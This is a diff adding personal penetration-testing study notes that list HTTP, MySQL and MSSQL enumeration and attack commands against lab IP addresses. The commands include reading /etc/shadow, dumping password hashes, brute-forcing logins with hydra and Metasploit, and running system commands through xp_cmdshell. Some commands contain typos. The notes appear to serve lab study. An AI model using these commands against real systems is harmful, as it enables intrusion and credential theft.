@@ -359,6 +359,223 @@ set userpass_file /user/share/wordlists/metasploit/root_userpass.txt
 set STOP_ON_SUCCESS true
 ```
 ## HTTP
+Some tools:
 
+Windows servers for hosting HTTP service Internet Infomation Services (IIS)
+```bash
+#dumps some info on the web server by using a bunch of scripts
+whatweb 10.4.18.97
+
+#gets header info from the server
+http 10.4.18.97
+
+#bf the directories
+dirb http://10.4.18.97
+
+#renders the site on command line ??? quite cool
+browsh --startup-url http://10.4.18.97/Default.aspx
+
+#nmap script to enum like dirb but smaller wlist
+nmap 10.4.18.97 -p80 --script http-enum
+
+#http header info
+nmap 10.4.18.97 -p80 --script http-headers
+
+#get method info from a given directory found from enum (enum or dirb)
+nmap 10.4.18.97 -p80 --script http-methods --script-args http-methods.url-path=/webdav/
+
+#scanner for webdav
+nmap 10.4.18.97 -p80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/
+```
+
+Ubuntu, Linux Unix distribution, Running Apache:
+Very similar enums as windows only until u get to the shell portions
+Eg service: Apache httpd 2.x.x (Ubuntu)
+```bash
+#pulls the banner. Good for finding service version
+nmap 192.32.62.3 -p80 -script banner
+
+#curl method for info, piped to "more" as the info is too much. "more" gives 1 page at a time
+#header info everything shows
+curl 192.32.62.3 | more
+
+#wget same as curl but downloads instead of stdout (1)
+wget "http://192.32.62.3/index"
+cat index | more
+
+#same as windows
+browsh --startup-url 192.32.62.3
+
+#renders the page but parses it as text (not as cool as browsh but more readable)
+lynx http://192.32.62.3
+ 
+```
+Metasploit enumeration method:
+```msfconsole
+#scans version
+use auxiliary/scanner/http/http_verison
+
+#uses the metasploit wordl to bf dirs
+use auxiliary/scanner/http/brute_dirs
+```
+
+```bash 
+#same as the brute dirs in msfconsole
+dirb http://192.32.62.3 /usr/share/metasploit-framework/date/wordlists/directory.txt
+```
+
+#### Robots.txt
+used by web browsers to understand which pages are within bounds to web crawl
+--> can be used to find subdirs and what not
+
+```msfconsole
+use auxiliary/scanner/http/robots.txt
+```
+curl any found subdir to check them out
 
 ## SQL
+#### Common linux sql server 
+Mysql
+Port: 3306
+connect to 
+```bash
+mysql -h 192.125.250.3 -u root 
+#defualt login with no password
+```
+
+Traverse the DBs
+```Mysql
+show database;
+
+use <database name>;
+show tables
+
+select * from <some table name>
+```
+
+MSF enumeration
+see the writable directories that not necessarily is part of the db
+```msfconsole
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
+
+#useful for setting global rhost
+setg rhosts 192.125.250.3
+
+#to see more options
+advanced
+```
+Another tool
+dumps users and their pwdhashes
+```msfconsole
+use auxiliary/scanner/mysql/mysql_hashdump
+
+#impt cos u need to assign it it as nothing
+set password ""
+```
+
+Mysql tricks 
+note: msf enums before showed that /etc/shadow is a writeable dir so it should load
+```mysql
+select load_file("/etc/shadow")
+```
+
+Nmap enum as usual
+```bash
+#check if there are any users with no passwords
+nmap 192.32.122.3 -p 3306 --script=mysql-empty-password 
+
+#info about the db
+nmap 192.32.122.3 -p 3306 --script=mysql-info
+#showed the ver number 
+# and Some capabilities: InteractiveClient which is allows access to the system via mysql
+
+#enum the users
+nmap 192.32.122.3 -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
+
+#enum the databases
+nmap 192.32.122.3 -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
+
+#enum the data
+nmap 192.32.122.3 -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
+#most impt is the data-dir: /var/lib/mysql shows where the vars are stored
+
+#full check to see if development passes safety
+nmap 192.32.122.3 -p 3306 --script=mysql-audit --script-args="mysqluser='root',mysqlpass='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
+
+#same hash dump as msf
+nmap 192.32.122.3 -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
+
+#using nmap to send a sql query??? cool but...just use mysql
+nmap 192.32.122.3 -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"
+```
+
+### Dictionary attack on db
+(note use tab completion for the pass_file......)
+if u need a password for a known username
+```msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set stop_on_success true
+set username root
+```
+
+hydra
+It autoknows to use standard port 3306 but if a non-std port used, pass it in aswell
+```
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.99.154.3 mysql
+```
+
+### Microsoft version of sql server
+MSSQL
+port: 1433
+```bash
+nmap 192.32.122.3 -p 1433 --script=ms-sql-info
+
+#ntlm is the authentication protocol used on networks (challenge/response)
+nmap 192.32.122.3 -p 1433 --script=ms-sql-ntlm-info --script-args mssql.instance-port=1433
+# above code spits out target_name and netbios info
+
+#brute force username and password
+nmap 192.32.122.3 -p 1433 --script=ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-commoon-passwords.txt
+
+#check for empty passwords
+nmap 192.32.122.3 -p 1433 --script=ms-sql-empty-password
+
+
+nmap 192.32.122.3 -p 1433 --script=ms-sql-query --script-args mssql.username=admin,mssql.password=safeword,ms-sql-query.query="SELECT * from master..syslogins" -oN output.txt
+#open output.txt with a text editor to make it easier ot see
+
+#hash dump
+nmap 192.32.122.3 -p 1433 --script=ms-sql-dump-hashes --script-args mssql.username=admin,mssql.pasword=anamaria
+
+nmap 192.32.122.3 -p 1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.pasword=anamaria,ms-sql-xp-cmdshell.cmd="ip config"
+```
+
+impt: For any version of sql can always check the nse site for useful scriptes to use
+
+##### Metaspoit for mssql
+if u know nothing bf everything
+```msfconsole
+use auxiliary/scanner/mssql/mssql_login
+set pass_file /root/Desktop/wordlist/common_users.txt
+set pass_file /root/Desktop/wordlist/100-common-passwords.txt
+set verbose false
+```
+
+Enumerate if user received (requires authentication is found)
+```msfconsole
+#enum the server using creds found before
+use auxiliary/admin/mssql/mssql_enum
+
+#enumerate the users
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+
+#try to run comands (whoami in this case) using a given set of creds
+use auxiliary/admin/mssql/mssql_exec
+set cmd whoami
+
+#brute force to find domain accts
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+
+```
